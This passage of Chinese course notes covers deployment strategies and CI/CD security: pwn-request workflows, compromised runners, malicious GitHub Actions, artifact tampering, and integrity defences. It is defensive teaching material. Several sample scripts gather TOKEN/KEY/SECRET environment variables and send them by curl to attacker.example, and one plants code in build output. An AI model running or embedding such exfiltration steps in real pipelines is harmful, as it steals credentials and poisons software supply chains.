做法是：先把 v2 部署到一个实例上，检查它的健康状态，再继续更新剩下的实例，一旦发现故障就停下来。讲师把它讲成了一个按周推进的例子：第一周只把服务器 1 换成 v2，其余两台还跑 v1；这一周里监控 v2 会不会崩溃、有没有引入错误、延迟正不正常；一切正常，第二周再换服务器 2；再过一周换服务器 3。**好处是停机时间短**（low downtime）：v2 有问题，只影响已经换过的那一两台。**风险是 v1 和 v2 会暂时共存**：一部分用户用新版本，一部分用户用旧版本，两个版本必须能同时工作（比如读写同一个数据库），这本身就可能出问题。

**第二种：蓝绿部署**（blue-green deployment，S20、S21）。**维持两套类生产环境**。用户的请求先到**负载均衡器**（load balancer），由它转发给后面的服务器。一开始，Blue 环境运行 v1，承接所有用户；Green 环境已经部署好 v2，但没有流量。**验证通过后，把流量从 Blue 切到 Green**（S20）。切换之后，Green 服务用户，Blue 保留旧版本作为后备：**回滚就是切回去**（rollback = switch back，S21）。S21 的总结是：**蓝绿部署降低风险的办法是切换流量，而不是在正在服务的环境里原地修改**。讲师的评价是，回滚非常容易，降低了停机的风险，"但还不够好"：切换的那一刻，所有用户一起换到了 v2。

**第三种：金丝雀发布**（canary release，S22）。**先让一小部分用户用新版本**。比如 95% 的生产流量继续走 v1，5% 走 v2（这 5% 就是"金丝雀"）；观察一段时间，没问题再扩大：**5% → 20% → 50% → 100%**。S22 列出了要监控的指标和这样做的好处：

| 要监控什么 | 为什么有帮助 |
|---|---|
| 错误率（error rate） | 限制爆炸半径（limits blast radius） |
| 延迟（latency） | 能发现只在生产环境出现的故障 |
| 崩溃率（crash rate） | 在全量发布之前就能回滚 |
| 日志与告警（logs and alerts） | |

讲师仍然用 Amazon 举例：发布 v2 时先切 5% 的流量，跑一周，拿 v2 的错误率、延迟、崩溃率和 v1 比；v2 不比 v1 差，就逐步加大比例，直到 100%。讲师说，**大多数公司用的是这一种**，因为新版本出问题时只影响很少的用户。网上偶尔有人说"我的 App 挂了，你的却没事"，往往就是因为他被分进了金丝雀那一组。CI 和 staging 会尽量多发现问题，但不能保证产品完美，有些故障只在真实的生产环境里出现；金丝雀发布让这类故障在很小的范围内暴露出来，发现 v2 表现不好，就把流量切回 v1，留出时间调试。

> 📎 **拓展(超出 slides)：为什么叫金丝雀** — 早年煤矿工人下井时带一只金丝雀。金丝雀对有毒气体比人敏感，它出事了，工人就知道该撤了。金丝雀版本扮演的就是这只鸟：让一小部分流量先去"试毒"。

三种策略的差别，可以用"出问题那一刻有多少用户在用 v2"来看。图 2 按讲师的例子画了出来。

```plot 图 2 · 三种部署策略下，用上新版本 v2 的用户比例随时间的变化（rolling 每周换一台服务器，共三台；canary 每周扩大一档）。假设 v2 有一个只在生产环境出现的 bug，第 3 天才暴露：这一刻 blue-green 已经让 100% 的用户用上了 v2，rolling 是 33%，canary 只有 5%
t = np.array([0, 7, 14, 21, 28])
bg = np.array([100, 100, 100, 100, 100])
roll = np.array([100 / 3, 200 / 3, 100, 100, 100])
can = np.array([5, 20, 50, 100, 100])
plt.step(t, bg, where="post", color="C2", lw=2)
plt.step(t, roll, where="post", color="C3", lw=2)
plt.step(t, can, where="post", color="C1", lw=2)
plt.text(4.5, 102, "blue-green：一次切换全部流量", color="C2", fontsize=9)
plt.text(7.4, 71, "rolling：逐台替换", color="C3", fontsize=9)
plt.text(7.4, 24, "canary：\n按比例放量", color="C1", fontsize=9)
plt.axvline(3, color="C0", ls="--", lw=1.2)
plt.text(3.5, 48, "第 3 天：\nbug 暴露", color="C0", fontsize=9)
for y, c in [(100, "C2"), (100 / 3, "C3"), (5, "C1")]:
    plt.scatter([3], [y], color=c, s=40, zorder=3)
plt.xlim(-1, 28)
plt.ylim(0, 110)
plt.xlabel("距开始发布的天数")
plt.ylabel("用上 v2 的用户比例 (%)")
```

图 2 里看第 3 天那条虚线和三条线的交点：canary 的爆炸半径最小。但图 2 只画了"暴露了多少人"，没画"多快能退回去"。蓝绿部署的长处在后者：流量一切就回到 v1，几秒钟的事；rolling 要把换过的服务器一台台换回来。所以三种策略各有取舍：

| 策略 | 控制了什么 | 好处 | 代价 / 风险 |
|---|---|---|---|
| rolling（S19） | 在哪里：一次换几台 | 停机时间短 | v1 和 v2 暂时共存 |
| blue-green（S20、S21） | 什么时候：一次性切换 | 回滚最快，切回去就行 | 切换时所有用户一起换；要维持两套环境，开销大 |
| canary（S22） | 向多少人：按比例放量 | 爆炸半径最小，能发现只在生产出现的故障 | 要有完善的监控来比较两个版本 |

> 📎 **拓展(超出 slides)：部署策略防不住什么** — 这些策略监控的是错误率、延迟和崩溃率，它们能发现**出故障**的版本，发现不了**故意不出故障**的版本。一个植入了后门、但功能一切正常的版本，在金丝雀阶段各项指标都很好看，最后照样放到 100%。§7.11 的 XZ Utils 后门就是这样：它被发现，只是因为有人注意到 SSH 登录慢了半秒。部署策略是可靠性工具，不是安全工具；供应链上的恶意代码要靠 §3.8 的完整性手段来防。

<details>
<summary>自测：一个服务通过了 CI 的全部测试，部署到 staging 却连不上数据库，因为生产数据库要求 TLS 连接。为什么 CI 没发现这个问题？</summary>

S16 说，CI 通过只说明代码在测试用的 runner 里能工作。CI 检查的是单元测试、构建、依赖安装和安全扫描，用的是测试数据和模拟的环境；staging 才检查真实的配置、数据库连接和网络规则。"生产数据库要求 TLS"属于真实配置，正是 staging 要发现的那类问题。

</details>

<details>
<summary>自测：下面两个场景各适合哪种部署策略？(1) 一家银行要求出问题时能在几秒内完全退回旧版本，也负担得起两套环境；(2) 一个有上千万用户的社交应用，想在影响尽量少的用户的前提下，发现只在生产环境出现的问题。</summary>

(1) 蓝绿部署：回滚就是把负载均衡器切回 Blue，最快；代价是维持两套环境，银行负担得起。(2) 金丝雀发布：先放 5% 的流量，拿 v2 的错误率、延迟、崩溃率和 v1 比，问题只影响一小部分用户（S22 的"限制爆炸半径"和"发现只在生产出现的故障"）。

</details>

<details>
<summary>自测：在 §2.4 的 workflow 里，哪些步骤会执行不是本项目维护者写的代码？</summary>

uses: actions/checkout@v4 执行的是第三方 Action 的代码；npm install 会执行依赖包自带的安装脚本，也是别人写的。npm test 和 ./analyze.sh 执行的是仓库里的代码，平时由维护者写；可如果这次运行处理的是一个陌生人的 PR，仓库里的代码就可能是那个陌生人改过的（§3.4）。

</details>

## 3. CI/CD 是一道安全边界

讲到这里，CI/CD 看起来是一个保护软件质量的工具。讲师接着问：CI/CD 是为了让开源软件安全、好用而设计的，**可 CI/CD 本身安全吗？** 本节的回答是：不一定，而且它一旦出事，后果比一般的软件更严重。

### 3.1 复杂、交互多、权限高 (S23)

S23 给出了三个原因，每个原因都推出一个后果：

| 原因（S23） | 具体是什么 | 后果 |
|---|---|---|
| **1. 复杂度高**（High Complexity） | 大量工具、依赖、脚本、runner 和服务 | 组件越多，**攻击面**越大 |
| **2. 交互多**（Many Interactions） | 连接着开发者、开源组件、测试、仓库、包仓库和各个环境 | 信任关系越多，暴露的地方越多 |
| **3. 权限高**（High Privilege） | 流水线能访问秘密、制品、基础设施和生产系统 | **一处被攻破，可能波及整个系统** |

讲师引用了网络安全里一条朴素的原则：**软件越复杂，被攻击的机会就越多**。CI/CD 很复杂，又和你的数据库、网络、各种配置打交道；它要访问这些资源，就必须持有权限。三条加在一起，使它成为一个诱人的攻击目标。

S23 的结论值得一字不差地记住：**CI/CD 不只是一个自动化工具，它是一道对安全至关重要的信任边界**（*CI/CD is not just an automation tool — it is a security-critical trust boundary*）。**它在整个软件生命周期里，把代码、人、基础设施、凭据和生产环境连在了一起。**

"信任边界"（trust boundary）在前几周出现过：第 8 周 §1.4 老师说，路径上的每一道边界，都是可能需要身份认证、授权或监控的地方。CI/CD 这道边界的特殊之处在于，**外部的代码**（陌生人的 PR、第三方依赖、别人写的 Action）和**内部的秘密**（部署 token、云凭据、签名密钥）在这里汇合，在同一台机器上、同一个时刻出现。

### 3.2 流水线能碰到什么 (S24)

S24 列出了 CI/CD 在构建、测试和部署时通常要访问的资源：

| 资源（S24） | 能做什么 |
|---|---|
| 源代码仓库 | 读代码、创建 commit、开启或合并 pull request |
| 包仓库 | 下载依赖、**发布包** |
| 构建环境 | 运行脚本、安装工具、**执行任意命令** |
| 云基础设施 | 部署服务、创建容器、**修改服务器** |
| 制品存储 | 上传二进制文件、容器镜像和发布文件 |

讲师逐行解释：CI/CD 几乎能读到你项目的全部源代码，还能往仓库里写东西；它帮你下载依赖，所以能访问包仓库；它在构建环境里运行你写的、别人写的脚本，安装工具、执行命令，讲师说**安全问题真正出现的地方就在这里**；部署到云上时，它能创建容器、修改服务器配置；它还能把软件的二进制文件上传到 PyPI 或 npm。

换一个角度读这张表的右栏：读写代码、发布包、执行任意命令、修改服务器、替换发布文件，这几乎就是一张**攻击者的愿望清单**。谁控制了流水线，谁就拿到了这些能力。

### 3.3 权限从哪里来：运行时注入的令牌和秘密 (S25, S26)

流水线有这么多权限，它们是怎么来的？讲师先排除了一个答案：难道让 runner 以 root 身份运行吗？讲师说，这正是**绝不能让软件以 root 运行**的原因（§4.5 会展开）。CI 平台的做法是**按需注入**。S25 画的流程是：

> workflow 定义 → CI/CD 平台 → runner 环境 → 脚本和命令

平台在 runner 环境这一步**注入令牌和秘密**（injected tokens and secrets）。讲师的解释是：workflow 说要运行某个 job，GitHub 就为它创建一个 runner 环境（Windows 或 Linux）；runner 要执行脚本，脚本需要权限，权限由平台把 token 和秘密注入 runner 来提供，runner 拿着它们去做对应的操作。S25 列出了四类会被注入的东西：

- **平台内置的令牌**，例如 `GITHUB_TOKEN`；
- **仓库或环境级别的秘密**（repository or environment secrets）；
- **云凭据，或者短期有效的身份令牌**（cloud credentials or short-lived identity tokens）；
- **包仓库的令牌，或者签名密钥**（package registry tokens or signing keys）。

S25 的最后一句是：**秘密不存放在源代码里，但运行中的 CI/CD job 能访问到它们**。

S26 用一个部署 workflow 演示了运行时发生的事：

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
          GITHUB_TOKEN: ${{ github.token }}
        run: ./deploy.sh
```

`./deploy.sh` 要部署东西，需要权限，权限来自 `env` 下面的两个 token：一个是有部署权限的 `DEPLOY_TOKEN`，一个是能访问 GitHub 资源的 `GITHUB_TOKEN`。讲师特别指出，`${{ secrets.DEPLOY_TOKEN }}` **不是 token 的值，只是它的名字**，相当于一个变量。job 真正运行时，CI 的**秘密存储**（secret store）按这个名字找到真正的值，注入 runner 的**环境变量**，`deploy.sh` 里的 shell 命令再从环境变量里读出来用。S26 右边的运行时流程就是：

> CI 秘密存储 → CI runner → 环境变量 → shell 命令

S26 底部的两句话是整个 §3 的枢纽，请记住：**CI 的秘密在仓库里看不到，但运行中的 job 能访问到它们。所以，控制了 CI 里运行什么代码，也就控制了谁能拿到这些令牌**（*controlling what code runs in CI is also controlling who can access the tokens*）。

这句话把问题简化了：攻击者不需要攻破 GitHub 的秘密存储，只需要**让自己的代码在一个拿着秘密的 job 里运行**。下面四类漏洞，就是让攻击者的代码进入这个 job（或者碰到它的产物）的四条路。

> 📎 **拓展(超出 slides)：`GITHUB_TOKEN` 和日志遮罩** — `GITHUB_TOKEN` 是平台为每个 job 自动生成的令牌，job 结束就失效；它能做什么由 workflow 里的 `permissions:` 决定，稳妥的默认值是只读（`contents: read`）。GitHub 还会在日志里把秘密的值显示成 `***`。但遮罩只是把日志里**原样出现**的秘密盖住，挡不住一个脚本把秘密编码后打印，更挡不住它把秘密发到别的服务器。§3.4 的攻击就是后者。

### 3.4 漏洞一：执行不可信的 PR 代码 (S27)

S27 的标题点出了第一条路：**源代码仓库的风险**。恶意的 pull request 可以修改构建脚本；如果 CI 把 PR 的代码检出（check out）并执行，runner 就可能运行攻击者控制的命令。S27 左边是有问题的 workflow：

```yaml
on: pull_request_target

steps:
  - uses: actions/checkout@v4
    with:
      # Checkout untrusted code from the PR
      ref: ${{ github.event.pull_request.head.sha }}

  - name: Build project
    # Executes build.sh from the PR
    run: ./build.sh
```

右边是攻击者修改过的 `build.sh`：

```bash
#!/bin/bash

echo "[+] building project"
npm install
npm test

# Malicious payload:
# read CI environment variables
env | grep -i "TOKEN\|KEY\|SECRET" \
  > /tmp/ci-secrets.txt

# send them to attacker-controlled server
curl -X POST \
  --data-binary @/tmp/ci-secrets.txt \
  https://attacker.example/collect
```

讲师让全班一起推理：任何人都能给一个公开仓库提交 PR。假设攻击者给 Linux 提交了一个 PR，而 workflow 先把代码检出到 PR 的那个 commit（`head.sha`），再执行 `./build.sh`。**这个 `build.sh` 是从哪里来的？** 从攻击者的分支来的，因为上一步已经切到了攻击者的代码。于是 runner 执行的是攻击者写的命令。

攻击者的脚本前半段和正常构建一模一样，打印构建信息、安装依赖、跑测试，看上去毫无异常；后半段才动手。`env` 列出所有环境变量，`grep` 从中筛出名字里带 TOKEN、KEY、SECRET 的行（讲师说 grep 就是"搜索"），存进一个临时文件；`curl` 是一个能在终端里发 HTTP 请求的工具，它把这个文件 POST 到攻击者控制的服务器 `attacker.example`。§3.3 说过，秘密在运行时注入为环境变量，所以这一行 `env | grep` 拿到的正是部署 token。讲师说，这是真实发生过的一类攻击。图 3 按时间顺序画出了全过程。

```d2 图 3 · 执行不可信 PR 代码的攻击（S27）：pull_request_target 让 workflow 以目标仓库的身份运行、拿着秘密；workflow 又检出并执行了 PR 里的 build.sh，于是攻击者的命令和秘密出现在同一台 runner 上
shape: sequence_diagram
atk: 攻击者
gh: GitHub 平台
run: runner
srv: "attacker.example"
atk -> gh: "提交 PR：改过的 build.sh"
gh -> run: "pull_request_target 触发，注入秘密"
run -> gh: "检出 PR 的 head.sha"
gh -> run: "攻击者的代码"
run -> run: "执行 ./build.sh：env 中筛出 TOKEN"
run -> srv: "curl POST 偷到的秘密"
```

关键在 S27 底部那句话：**`pull_request_target` 可以带着更高的仓库信任运行；风险出现在 workflow 明确检出 PR 的代码、再执行 PR 里的文件的时候。GitHub 把这种写法列为不安全的模式。**

> 📎 **拓展(超出 slides)：`pull_request` 和 `pull_request_target` 差在哪里** — 两者都由 PR 触发，差别在"以谁的身份运行"。`pull_request` 以 PR 的身份运行：来自 fork 的 PR 拿不到仓库的秘密，`GITHUB_TOKEN` 也只有读权限，跑陌生人的代码相对安全。`pull_request_target` 以**目标仓库**的身份运行：用的是目标仓库里的 workflow 定义，能拿到秘密，`GITHUB_TOKEN` 可以写。它本来是为"给 PR 贴标签、自动回复评论"这类**不执行 PR 代码**的任务设计的。S27 的错误，是把这种高信任的触发方式和"检出并执行 PR 代码"组合在了一起。GitHub 的安全团队给这类漏洞起了个名字，叫"pwn request"。

课上的讨论很有意思。有同学问："这是在虚拟机上运行的吗？"讲师说是在 CI runner 上，机制和虚拟机类似。另一位同学提出了防御思路：**既然环境变量来自 CI，构建脚本能不能也来自 CI，而不是来自 PR？** 讲师说这正是现在的缓解办法：不要运行攻击者分支里的构建脚本，只运行主分支上的、自己的脚本，或者明确规定只有主分支上的构建才允许运行。

> **🔑 例：把 S27 的 workflow 改安全** — 先想清楚这个 job 要做什么。如果目的是**构建和测试 PR 的代码**，就不需要任何秘密：
>
> ```yaml
> on: pull_request            # 不用 pull_request_target
> permissions:
>   contents: read            # GITHUB_TOKEN 只读
> jobs:
>   build:
>     runs-on: ubuntu-latest
>     steps:
>       - uses: actions/checkout@v4
>       - run: ./build.sh     # 仍然执行 PR 里的脚本，但这个 job 里没有秘密可偷
> ```
>
> 攻击者的 `build.sh` 照样会运行，可 `env` 里只剩一个只读的 token，偷走也没用。如果确实需要 `pull_request_target`（比如要给 PR 写评论），那就**不检出、不执行 PR 的代码**，只读取 PR 的元数据。两种做法的思路相同：**让不可信的代码和秘密不出现在同一个 job 里**。这也是 §2.6 那条隔离线的具体落实。

### 3.5 漏洞二：被攻破的 runner (S28)

第二条路换了一个假设（S28）：**攻击者已经攻破了一台自托管的 CI runner**（self-hosted runner），以后的可信 job 都会在这台机器上执行。S28 左边是一个完全正常的流程：检出 main、`npm install`、`npm run build`、`npm test`、把 `dist/` 打包成 `app.tar.gz`。右边是早已潜伏在 runner 上的恶意进程：

```bash
# malicious process already
# running on the CI runner

while true; do
  if [ -d "$CI_WORKSPACE/dist" ]; then
    echo "[!] job detected"
    env | grep -Ei \
      "TOKEN|KEY|SECRET"
    echo "/* modified */" \
      >> "$CI_WORKSPACE/dist/app.js"
  fi
  sleep 5
done
```

它每 5 秒看一眼工作目录，一旦出现 `dist/`（说明有 job 正在构建），就做两件事：**偷走环境变量里的秘密**，并且**往构建产物 `app.js` 里追加内容**（示例里只追加了一行注释，真实攻击会追加恶意代码）。S28 的结论是：**workflow 本身可能完全合法，但一台被攻破的 runner 能窃取凭据，并篡改以后所有可信构建的输出**。

讲师强调了第二件事的后果。攻击者控制了 runner，当然能监听上面运行的所有 job，拿到秘密是意料之中的；更值得注意的是，**它能修改 CI 正在处理的代码和产物**。CI 的输出会交给 CD 去部署，所以攻击者改了 CI 的输出，就等于控制了部署：你上线的是攻击者的东西。

几位同学对"攻破的到底是哪个文件"有些困惑，问是不是 YAML 文件被改了。讲师和主讲老师解释：不是某个文件，而是**整台机器**。runner 就像一台虚拟机，你的代码在这台机器上运行，而这台机器已经被攻击者控制；攻击者能控制的不只是 YAML 文件，而是在这台机器上执行的所有 job。还有同学问，攻击者怎么拿到 runner 的控制权？讲师说这是一个**很强的假设**，具体的入侵方法留到后面的案例（§7.12）；防御上，讲师认为最好的办法是**短生命周期的 runner**（short-lived runner）：runner 很快就过期销毁，攻击者即使控制了它，也只能控制大约 5 分钟，影响有限。

> 📎 **拓展(超出 slides)：为什么偏偏是"自托管"runner** — GitHub 自己提供的 runner（GitHub-hosted）每个 job 都是一台全新的虚拟机，job 结束就销毁。自托管 runner 是你自己的机器，**长期存在、被一个又一个 job 反复使用**。S28 的恶意进程之所以能"等待以后的 job"，靠的就是这种持久性。入侵的途径之一正是 §3.4：如果一个公开仓库让陌生人的 PR 在自托管 runner 上运行，攻击者的 PR 就可以在机器上留下一个后台进程，等着后面的可信构建。所以 GitHub 建议不要给公开仓库配自托管 runner。

把 §3.4 和 §3.5 放在一起看，是两种对称的情况：§3.4 是**不可信的代码跑在可信的机器上**，§3.5 是**可信的代码跑在不可信的机器上**。结局一样：攻击者的代码和秘密、和产物出现在了同一个地方。

### 3.6 漏洞三：第三方 CI 组件 (S29)

第三条路回到了 §2.4 埋下的伏笔（S29）：现代流水线依赖外部的 **GitHub Action、CI 插件、Docker 镜像和可复用的 workflow**（reusable workflows）。**这些组件一旦被攻破，恶意代码就会作为流水线的一部分执行。** S29 的例子：

```yaml
steps:
  - uses: actions/checkout@v4

  - uses: some-org/build-action@v1

  - run: make
```

假如 `some-org/build-action@v1` 里藏着这样的内容：

```bash
#!/bin/bash

echo "Stealing token..."
curl -X POST \
  https://attacker.example \
  -d "$GITHUB_TOKEN"
```

讲师的问法是：我们前面用别人写的 `actions/checkout` 帮我们检出代码，**可如果 checkout 本身是恶意的呢？** 我们在用别人开发的库，库里藏着恶意代码，它就能从 CI 里偷走 token，发到攻击者的服务器。

这一条正是考试范围里那句"**CI/CD 流水线里第三方组件带来的风险**"。写一行 `uses:`，就是让一段别人的代码，以你流水线的全部权限，在你的 runner 上运行。它和 §7 讲的依赖是同一回事：Action 就是你的流水线的依赖。

> 📎 **拓展(超出 slides)：`@v1` 背后的代码可以悄悄换掉** — `@v1` 是 Git 的**标签**（tag），而标签可以移动：Action 的作者（或者盗用了作者账号的攻击者）随时可以把 `v1` 指向一个新的 commit，你的 workflow 一个字没改，下次运行的却是新代码。2025 年 3 月，被两万多个仓库使用的 Action `tj-actions/changed-files` 就这样被攻破：攻击者把它几乎所有的历史版本标签都改指向一个恶意 commit，这个 commit 从 runner 进程的内存里读出秘密，编码后打印到 workflow 日志里；公开仓库的日志人人可看，秘密就这样公开了（CVE-2025-30066）。常见的防御是：把 Action **固定到完整的 commit 哈希**（`uses: actions/checkout@` 后面跟 40 位的 commit SHA，哈希不能被移动），像审查依赖一样审查 Action，用 `permissions:` 把 token 的权限压到最小，优先用官方或经过验证的 Action。

### 3.7 漏洞四：被篡改的构建产物 (S30)

前三条路都在"运行时"下手，第四条路针对**结果**（S30）：**源代码可能完全没有问题，但发布出去的制品仍然可能在用户下载之前被替换**。S30 的流程是：构建出正常的程序 → `build/app` → 攻击者替换文件 → 发布出去的是恶意程序。workflow 本身很普通：

```yaml
steps:
  - name: Build
    run: make

  - name: Upload artifact
    uses: actions/upload-artifact@v4
    with:
      name: app
      path: build/app
```

攻击者只需要在"构建"和"上传"之间插进一步：

```bash
# Build produced a clean binary
make

# Attacker replaces the artifact
cp malware build/app

# CI uploads build/app
# Users later download malware
```

S30 用一句话提出了**制品完整性**（artifact integrity）的问题：**发布出去的文件，是否恰好就是可信构建产出的那个制品？** 讲师说这一条和 §3.5 很像：攻击者控制了构建，把 CI 的输出换成了恶意的，CD 部署的就是这个恶意版本，**所有下游用户都会受影响**。讲师给出的办法是**给 CI 的产物签名**：CI 产出制品时附上签名，用户下载后验证，就能确认手里的文件和 CI 产出的是同一个。

这个"插进来的一步"可以有很多来源：一个被合并的恶意 PR 改了 workflow（§3.4），被攻破的 runner（§3.5），被攻破的第三方 Action（§3.6），或者攻击者盗用了发布账号，直接替换了下载服务器上的文件。不管从哪里来，防御都落在下一节的问题上：用户怎样确认手里的文件没被换过？

### 3.8 构建与发布的完整性 (S31)

S31 的第一句话把问题说得更尖锐：**发布出去的制品，可能并不是审查者检查过的那份软件**。从源代码到用户手里，要经过四个环节，每个环节都可能被做手脚：

| 环节（S31） | 可能被做的手脚（S31） |
|---|---|
| 源代码 Source Code | （审查者看的是这里） |
| 构建环境 Build Environment | 被污染的编译器（polluted compiler）、恶意的依赖（malicious dependency） |
| 构建产物 Build Artifact | 构建之后被替换（artifact replaced after build） |
| 发布包 Release Package | 没有签名、没有经过验证的发布（unsigned or unverified release） |

S31 提出的**完整性问题**是：**用户能不能验证，他下载的二进制文件或软件包，是用预期的构建流程、从预期的源代码构建出来的？** 它拆成三个具体的问题：**制品签名了吗？有来源证明（provenance）吗？构建可复现（reproducible）吗？** S31 右边给出了最基本的一步，校验和（checksum）：

```bash
# Developer publishes expected hash
sha256sum app.tar.gz

# User verifies downloaded artifact
sha256sum -c app.tar.gz.sha256
```

开发者发布时算出文件的 SHA-256 哈希并公布；用户下载后用 `sha256sum -c` 重新计算、比对。S31 的说明是：**如果制品在构建之后被替换，校验和或签名就对不上了**。

> **🔑 例：每一种验证各证明了什么** — 这四种手段经常被混为一谈，它们回答的其实是四个不同的问题。
>
> | 手段 | 回答的问题 | 挡得住 | 挡不住 |
> |---|---|---|---|
> | **校验和**（checksum，如 SHA-256） | 我下载的文件，和那个哈希对应的文件是否逐位相同？ | 下载过程中的损坏和替换 | 攻击者同时替换了文件和旁边的 `.sha256` 文件；构建本身被污染 |
> | **签名**（signature） | 这个文件是不是持有开发者私钥的人签发的，签发后有没有被改过？ | 发布之后的替换；冒充开发者发布 | 签名之前就被植入的恶意代码（§7.6 的 SolarWinds 更新就带着合法签名） |
> | **来源证明**（provenance attestation） | 这个文件是由哪个仓库、哪个 commit、哪条 workflow、在哪台构建机上构建的？ | 用别的源代码或别的构建流程冒充 | 那条"预期的"流程本身被攻破 |
> | **可复现构建**（reproducible build） | 别人用同一份源代码和工具链重新构建，能不能得到逐位相同的结果？ | 被污染的构建环境、被替换的产物 | 源代码本身就有恶意内容 |
>
> 逐行解释一下。校验和用的是第 2 周 §1.4 的哈希：文件改一个比特，哈希就完全不同。但哈希本身不带身份，攻击者既然能替换下载服务器上的文件，往往也能替换放在旁边的哈希值，所以哈希要从**另一条可信的渠道**拿到，或者本身被签名。签名用的是第 3 周 §1.3 的公钥签名：只有持有私钥的人做得出来，人人都能用公钥验证；第 3 周 §1.4 说过，签名像防拆封条。可封条只能证明"封上之后没被拆过"，证明不了"封进去的东西没问题"：如果恶意代码在构建阶段、签名之前就进去了，签名会忠实地给恶意版本盖章。来源证明补上了"从哪里来"：它是构建系统签发的一份声明，写明这个制品（用哈希标识）由哪个仓库的哪个 commit、经哪条 workflow 构建，用户可以核对这是不是预期的源代码和预期的流程，这正是 S31 那个完整性问题的前半句。可复现构建补上了"构建环境是否可信"：如果同一份源代码、同一套工具链，在不同的人、不同的机器上构建出逐位相同的结果，那么只要有一个独立的构建者得到不同的哈希，就说明某一方的构建环境被动了手脚。

> 📎 **拓展(超出 slides)：被污染的编译器** — S31 里的"polluted compiler"有一个著名的思想实验。1984 年，Unix 的作者之一 Ken Thompson 在演讲《Reflections on Trusting Trust》里描述了一个被改过的 C 编译器：它在编译登录程序时自动插入一个后门；在编译**编译器自己**时，又把这段插入逻辑原样复制进新的编译器。于是编译器的源代码和登录程序的源代码都没问题，后门却一代代传了下去。这说明"审查源代码"不够，还得信任把源代码变成程序的那些工具。可复现构建（最好用不同来源的编译器交叉验证）是对付它的办法之一。§1.2 的表里，Clang 和 LLVM 也是开源组件，原因就在这里。

### 3.9 缓解措施：每一环都少一点信任 (S32)

S32 把四类威胁和对应的控制措施列成了一张图。下表加上了"它为什么管用"：

| 威胁（S32） | 对应的漏洞 | 控制措施（S32） | 为什么管用 |
|---|---|---|---|
| **仓库被攻破**（compromised repository） | §3.4 | **受保护分支**（protected branches） | 不许任何人直接推送到 main，改动只能通过 PR 进入 |
| | | **强制审查**（mandatory review） | 每个 PR 至少要另一个人批准才能合并 |
| | | **签名的 commit**（signed commits） | commit 带着作者私钥的签名，冒充别人提交会被发现 |
| **不可信的 CI runner**（untrusted CI runner） | §3.5 | **短生命周期的 runner**（short-lived runners） | 每个 job 用一台新机器，用完销毁，恶意进程等不到下一个 job |
| | | **沙箱化构建**（sandboxed builds） | 构建和宿主机、和网络隔离开 |
| | | **不共享工作区**（no shared workspace） | 一个 job 没法读写另一个 job 的目录和产物 |
| **CI 秘密泄露**（leaked CI secrets） | §3.4、§3.6 | **最小权限的令牌**（least-privilege tokens） | 令牌只能做这个 job 需要的事，泄露了危害也有限 |
| | | **OIDC 短期凭据**（OIDC short-lived credentials） | 不存长期有效的密钥，每次运行现领一个几分钟就过期的凭据 |
| | | **秘密扫描**（secret scanning） | 在秘密进入仓库和日志之前把它找出来（§5.5） |
| **发布制品被篡改**（tampered release artifact） | §3.7 | **校验和 + 签名**（checksum + signature） | 发布后的任何替换都会被发现（§3.8） |
| | | **来源证明**（provenance attestation） | 能核对制品是从哪份源代码、经哪个流程构建出来的 |
| | | **可复现构建**（reproducible build） | 独立重建可以发现被污染的构建环境 |

讲师课上的总结和这张表一一对应：对付被攻破的仓库，**永远不要信任别人发来的请求**，只允许可信的人把代码合并进受保护的分支；对付被攻破的 runner，用很快就过期的短期 runner；对付被偷走的 CI 密钥，同样用短期的秘密，即使被攻击者拿到也很快失效，并且让秘密**只拥有它需要的权限，而不是 root 权限**；对付被篡改的发布制品，用校验和与签名验证它是不是当前 CI 的产物。

表里只有 OIDC 一项需要多解释几句。传统做法是把一把云平台的长期访问密钥（比如第 4 周 §2.7 的 AWS access key）存成仓库秘密，每次部署都用它；它一旦泄露，攻击者可以一直用下去，直到有人发现并轮换。**OIDC**（OpenID Connect）的做法是：CI 平台给每次运行签发一个身份令牌，内容大致是"我是某仓库 main 分支上的某条 workflow"；云平台事先配置好"只信任这个仓库的这个分支"，验证令牌后，发给这次运行一个**几分钟后就过期**的临时凭据。仓库里根本没有长期密钥可偷，偷到的临时凭据很快作废。这和第 4 周 §4.5 讲的密钥轮换是同一个方向，只是把"轮换周期"缩短到了一次运行。

S32 底部的结论是本节的总纲：**CI/CD 的加固不是某一项控制措施，而是在每一个阶段都减少信任：源代码、runner、凭据、依赖、构建输出和发布**。注意这句话里提到了"依赖"，可图里的四类威胁没有单列 §3.6 的第三方组件。按同样的思路补上：对第三方 Action 和依赖，就是固定版本（固定到 commit 哈希）、审查后再用、只给最小权限。

<details>
<summary>自测：一个公开仓库用 pull_request_target 触发一条 workflow，先检出 PR 的代码，再运行 npm test；这条 workflow 的环境变量里有一个能发布 npm 包的 token。攻击者能做什么？怎样修？</summary>

npm test 执行的是 package.json 里的 test 脚本，而 package.json 来自 PR，攻击者可以把 test 脚本改成任何命令，比如把环境变量里的 npm token 发到自己的服务器（S27 的手法）。拿到 token 之后，攻击者能以项目的名义往 npm 发布一个恶意版本，所有下游用户都会装到它，这就从 CI 漏洞变成了 §7 的供应链攻击。修法：跑测试改用 pull_request 触发（拿不到秘密，token 只读）；发布用的 token 只放在发布 job 里，而发布 job 只在 main 分支、审批通过后运行（§2.6 的隔离）。

</details>

<details>
<summary>自测：你的 workflow 里写着 uses: some-org/build-action@v1。说出两种情况，使得 @v1 背后的代码在你没改 workflow 的情况下变了；再说一个防御办法。</summary>

一，Action 的作者把 v1 标签移到了一个新的 commit（标签可以移动），新代码可能有问题，也可能作者本人不可信。二，作者的账号被盗，攻击者把标签指向恶意 commit（2025 年 tj-actions/changed-files 就是这样）。防御：把 Action 固定到完整的 commit 哈希，哈希对应的内容不能被改；同时用 permissions 把 GITHUB_TOKEN 的权限压到最小，即使代码是恶意的，能偷到的东西也有限。

</details>

<details>
<summary>自测：判断对错并说明理由——"我们的每个发布版本都有合法的数字签名，所以用户不会受到供应链攻击。"</summary>

错。签名证明的是"这个文件由持有私钥的人签发，签发后没被改过"，证明不了签发之前文件里有什么。如果攻击者在构建阶段、签名之前植入了恶意代码（被污染的构建环境、被攻破的 runner），签名会照样盖在恶意版本上；§7.6 的 SolarWinds 更新就带着合法签名。要回答"构建过程是否可信"，还需要来源证明和可复现构建（S31）。

</details>

## 4. 配置：同一份代码，不同的安全结果

